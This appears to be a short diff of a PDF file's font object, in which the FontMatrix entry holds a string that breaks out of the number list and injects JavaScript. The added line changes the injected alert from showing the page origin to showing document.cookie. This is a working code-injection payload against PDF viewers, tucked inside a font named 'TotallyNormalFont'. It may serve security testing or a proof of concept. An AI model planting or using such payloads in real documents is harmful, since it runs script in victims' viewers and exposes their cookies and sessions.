@@ -27,7 +27,7 @@ endobj
 /BaseFont/TotallyNormalFont
 /LastChar 102
 /Encoding/WinAnsiEncoding
-/FontMatrix [0.1 0 0 0.1 0 (1\); alert\("XSS:" + location.origin\)//)]
+/FontMatrix [0.1 0 0 0.1 0 (1\); alert\("XSS:" + document.cookie\)//)]
 /Subtype/Type1
 /FirstChar 65
 /FontDescriptor 9 0 R
